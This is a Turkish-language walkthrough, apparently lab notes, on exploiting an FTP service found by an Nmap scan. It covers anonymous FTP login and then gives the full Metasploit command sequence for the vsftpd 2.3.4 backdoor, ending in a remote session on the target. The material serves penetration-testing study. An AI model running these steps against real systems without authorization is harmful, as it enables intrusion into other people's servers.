- 🔎 **Nmap taraması** incelendiğinde, **21 numaralı port (FTP)** açık olarak görünür ve burada sızılabilecek iki önemli açık tespit edilir:

---

## 🔓 Anonymous FTP Allowed

- Bu, FTP sunucusuna **anonymous (kimliksiz)** kullanıcı olarak giriş yapılabileceğini gösterir.

- Bağlantı için:
  ```bash
  ftp <target ip>
  ```

- Giriş sırasında kullanıcı adı ve parola sorulduğunda:
  - `anonymous` yazılarak oturum açılır.

- ⚠️ FTP'ye bağlanmak doğrudan sunucuyu ele geçirmek anlamına gelmez.  
  Ancak bu bağlantı üzerinden **sunucuya dosya yüklenebilir**, bu da saldırganın kötü amaçlı içerik bırakmasına olanak tanır.

---

## 📦 Versiyon Açığı: vsftpd 2.3.4

- 🔍 Nmap taramasında FTP servisinin **vsftpd 2.3.4** sürümünü kullandığı tespit edilir.

- Bu sürümle ilgili bilinen açıkları araştırmak için:
  ```text
  vsftpd 2.3.4 exploit
  ```
  şeklinde bir internet araması yapılır.

- 🌐 Genellikle ilk sonuçlarda, Rapid7 tarafından hazırlanmış bir **Metasploit modülü** bulunur. Bu açık, arka kapı (backdoor) içeren bir sürümdür.

---

### 🚀 Exploit Kullanımı (Metasploit Framework)

1. Metasploit başlatılır:
   ```bash
   msfconsole
   ```

2. Exploit modülü seçilir:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. Hedef ve seçenekler yapılandırılır:
   ```bash
   show targets
   set target 0
   show options
   set rhosts <target ip>
   ```

4. Exploit çalıştırılır:
   ```bash
   exploit -j -z
   ```

5. Açılan oturumlar listelenir ve bağlantı kurulur:
   ```bash
   sessions -l
   sessions 1
   ```
6. Operasyon bittiği takdirde çıkış yapılır:
   ```bash
   background 
   exit
   ```
---

✅ **Sonuç:** Bu işlem sonucunda, hedef sistem üzerinde bir oturum (session) açılır ve sunucuya doğrudan bağlantı sağlanır. Yani sistem ele geçirilmiş olur. 💻🔐
